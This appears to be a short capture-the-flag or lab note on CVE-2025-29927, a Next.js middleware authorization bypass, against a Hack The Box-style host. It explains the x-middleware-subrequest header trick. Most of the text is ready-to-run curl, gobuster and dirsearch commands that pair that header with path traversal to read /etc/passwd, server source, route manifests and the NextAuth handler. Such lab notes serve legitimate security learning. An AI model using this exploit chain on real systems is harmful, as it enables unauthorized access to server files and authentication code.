You found a CVE-2025-29927

What is middleware???--->
-Middleware is custom logic that runs before a request is completed.
-It sits between the request and the response, allowing you to inspect, modify, or redirect requests before they reach a page or API route.
-Think of it as a checkpoint in the request flow.

When a request comes in, Next.js may internally re-run the request multiple times through middleware.
Example: if a middleware rewrites /dashboard → /auth-check → /dashboard, the framework loops the request through the middleware again.

To avoid infinite loops, Next.js adds a special header: x-middleware-subrequest: middleware:middleware:middleware

SO: By manually adding it (x-middleware-subrequest: middleware:middleware:...) you are essentially tricking the server into treating your request as an internal re-run.

1. curl -s 'http://xxx.htb/api/download?example=../../../../../../etc/passwd' -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'

2.  API enumeration
gobuster dir -u "http://xxx.htb/api/download?example=../../../app/.next/" \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"   

3. curl -s "http://xxx.htb/api/download?example=../../../../../../app/server.js" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

4. curl -s "http://xxx.htb/api/download?example=../../../../../../app/.next/routes-manifest.json" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
gts:
"dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",

5. curl -s "http://xxx.htb/api/download?example=../../../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"







dirsearch -u http://xxx.htb/api/ \
-w /usr/share/wordlists/dirb/common.txt \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
